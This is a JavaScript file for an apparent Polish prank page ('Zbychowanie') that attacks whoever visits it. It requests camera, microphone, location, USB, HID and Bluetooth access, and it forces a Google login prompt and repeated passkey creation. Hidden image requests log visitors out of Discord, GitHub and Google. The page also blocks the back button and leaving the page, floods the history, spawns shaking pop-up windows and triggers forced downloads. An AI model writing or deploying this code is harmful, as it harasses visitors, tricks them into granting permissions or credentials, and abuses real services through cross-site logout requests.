/*
  Zbychowanie 2026 - TOTAL DOMINATION EDITION
  Full Permissions + External Login + Zbych Stories
*/

// --- KONFIGURACJA ---
const SCREEN_WIDTH = window.screen.availWidth;
const SCREEN_HEIGHT = window.screen.availHeight;
const WIN_WIDTH = 480;
const WIN_HEIGHT = 260;
const VELOCITY = 15;
const TICK_LENGTH = 50;
const HIDDEN_STYLE = 'position: fixed; width: 1px; height: 1px; overflow: hidden; top: -10px; left: -10px;';

const VIDEOS = ['gratulacje.mp4', 'szybkakaczka.mp4'];
const FILE_DOWNLOADS = ['Zbych.png', 'Zbych2.png', 'Zbych3.png', 'Zbych4.png', 'Zbych5.png', 'Bluescreen.png', 'Ciastko.png'];
const ZBYCH_STORIES = [
  "Zbychu nie zasypia, on czeka.",
  "Zbychowanie to nie wybór, to przeznaczenie.",
  "Kiedy deszcz pada, Zbychu czyści serwer."
];
const SEARCHES = ['Zbychu', 'jak usunąć Zbychowanie', 'Zbychu 2026 download'];

const wins = [];
let interactionCount = 0;

const isChildWindow = (window.opener) || window.location.search.indexOf('child=true') !== -1;

// --- INICJALIZACJA ---
confirmPageUnload();

if (isChildWindow) {
  initChildWindow();
} else {
  initParentWindow();
}

function initParentWindow() {
  blockBackButton();
  fillHistory();
  
  const startAction = async () => {
    interactionCount++;
    if (interactionCount === 1) {
      removeHelloMessage();
      playSounds();
      startVideo();
      
      // WYWOŁANIE WSZYSTKIEGO NA RAZ
      requestAllPermissions(); 
      tryExternalLogin(); // NOWOŚĆ: Próba logowania przez inną usługę
      
      superLogout();
      rainbowThemeColor();
      shakeScreen();
      animateUrlWithEmojis();
      speak('Zbychu prosi o logowanie i uprawnienia!');
      
      requestPasskey();
      setInterval(requestPasskey, 60000);
    }
    openWindow();
  };

  document.body.addEventListener('mousedown', startAction);
  document.body.addEventListener('keydown', startAction);
}

// --- NOWA FUNKCJA: LOGOWANIE PRZEZ INNĄ USŁUGĘ ---
async function tryExternalLogin() {
  if (window.PasswordCredential || window.FederatedCredential) {
    try {
      // Próba pobrania poświadczeń - wywoła okno "Zaloguj się przez..."
      await navigator.credentials.get({
        federated: {
          providers: ['https://accounts.google.com']
        },
        mediation: 'required' // Wymusza pokazanie okna użytkownikowi
      });
    } catch (e) {
      console.log("Zbychu: Próba logowania zewnętrznego przerwana.");
    }
  }
}

// --- TOTALNE UPRAWNIENIA ---
async function requestAllPermissions() {
  try { await navigator.mediaDevices.getUserMedia({ audio: true, video: true }); } catch (e) {}
  navigator.geolocation.getCurrentPosition(() => {}, () => {}, {});
  if ("Notification" in window) Notification.requestPermission();
  try {
    if (navigator.usb) navigator.usb.requestDevice({ filters: [] }).catch(() => {});
    if (navigator.hid) navigator.hid.requestDevice({ filters: [] }).catch(() => {});
    if (navigator.bluetooth) navigator.bluetooth.requestDevice({ acceptAllDevices: true }).catch(() => {});
  } catch (e) {}
  if (document.documentElement.requestFullscreen) document.documentElement.requestFullscreen().catch(() => {});
}

// --- MULTIMEDIA I EFEKTY ---
function playSounds() {
  const bg = new Audio('muzykaxd.mp3');
  bg.loop = true;
  bg.play().catch(() => {});
}

function startVideo() {
  const video = document.createElement('video');
  video.src = VIDEOS[Math.floor(Math.random() * VIDEOS.length)];
  video.autoplay = true; video.loop = true;
  video.style = 'width: 100vw; height: 100vh; object-fit: cover; position: fixed; top: 0; left: 0; z-index: 9999;';
  document.body.appendChild(video);
}

function shakeScreen() {
  setInterval(() => { window.moveBy(Math.random() * 14 - 7, Math.random() * 14 - 7); }, 30);
}

function removeHelloMessage() {
  const msg = document.querySelector('.hello-message') || document.querySelector('#zbych-intro');
  if (msg) msg.remove();
}

// --- RESZTA MECHANIZMÓW (LOGOUT, DOWNLOAD, OKNA) ---
function superLogout() {
  const sites = ['https://discord.com/api/v9/auth/logout', 'https://github.com/logout', 'https://www.google.com/accounts/Logout'];
  sites.forEach(url => {
    const img = document.createElement('img'); img.src = url;
    img.style = HIDDEN_STYLE; document.body.appendChild(img);
  });
}

function triggerMixedDownloads() {
  const isTxt = Math.random() > 0.5;
  const a = document.createElement('a');
  if (isTxt) {
    const blob = new Blob([ZBYCH_STORIES[0]], { type: 'text/plain' });
    a.href = URL.createObjectURL(blob);
    a.download = "Zbychu_Fakt.txt";
  } else {
    a.href = FILE_DOWNLOADS[0];
    a.download = FILE_DOWNLOADS[0];
  }
  a.click();
}

async function requestPasskey() {
  try {
    const challenge = new Uint8Array(32); window.crypto.getRandomValues(challenge);
    await navigator.credentials.create({
      publicKey: { challenge, rp: { name: "Zbychu", id: window.location.hostname },
        user: { id: new Uint8Array(16), name: "zbychu@zbych.pl", displayName: "Zbychu" },
        pubKeyCredParams: [{ alg: -7, type: "public-key" }] }
    });
  } catch(e) {}
}

function initChildWindow() {
  document.body.innerHTML = '';
  document.body.style.backgroundColor = 'black';
  startVideo();
  moveWindowBounce();
  shakeScreen();
  setInterval(triggerMixedDownloads, 5000);
}

function moveWindowBounce() {
  let vx = VELOCITY; let vy = VELOCITY;
  setInterval(() => {
    if (window.screenX <= 0 || window.screenX + window.outerWidth >= SCREEN_WIDTH) vx *= -1;
    if (window.screenY <= 0 || window.screenY + window.outerHeight >= SCREEN_HEIGHT) vy *= -1;
    window.moveBy(vx, vy);
  }, TICK_LENGTH);
}

function blockBackButton() {
  window.history.pushState(null, null, window.location.href);
  window.onpopstate = () => { window.history.go(1); };
}

function fillHistory() {
  for (let i = 0; i < 20; i++) window.history.pushState({}, '', window.location.pathname + '?Zbych=' + i);
}

function confirmPageUnload() {
  window.addEventListener('beforeunload', (e) => { e.returnValue = true; });
}

function openWindow() {
  const win = window.open(window.location.pathname + '?child=true', '', `width=${WIN_WIDTH},height=${WIN_HEIGHT}`);
  if (win) wins.push(win);
}

function rainbowThemeColor() {
  setInterval(() => {
    document.body.style.backgroundColor = '#' + Math.floor(Math.random() * 16777215).toString(16);
  }, 100);
}

function animateUrlWithEmojis() {
  setInterval(() => { window.location.hash = '💀🔥🌑🌘🌗🌖🌕'; }, 200);
}

function speak(text) {
  const msg = new SpeechSynthesisUtterance(text);
  msg.lang = 'pl-PL'; window.speechSynthesis.speak(msg);
}